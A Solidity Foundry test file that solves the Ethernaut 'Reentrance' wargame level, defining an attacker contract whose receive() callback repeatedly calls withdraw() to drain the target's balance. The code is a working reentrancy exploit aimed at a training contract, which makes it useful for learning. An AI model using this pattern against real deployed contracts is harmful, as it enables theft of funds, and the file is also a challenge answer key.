pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IReentrance r;
    uint256 b;

    constructor(IReentrance _r) {
        r = _r;
    }

    function attack(uint256 _b) external {
        b = _b;
        r.withdraw(b);
    }

    receive() external payable {
        if (address(r).balance > 0) {
            r.withdraw(b);
        }
    }
}

contract Ethernaut10 is EthernautTest {
    constructor() EthernautTest(10) {}

    function solve() internal override(EthernautTest) {
        uint256 balance = address(instance).balance;
        Attacker attacker = new Attacker(IReentrance(instance));
        IReentrance(instance).donate{value: balance}(address(attacker));
        attacker.attack(balance);
    }
}
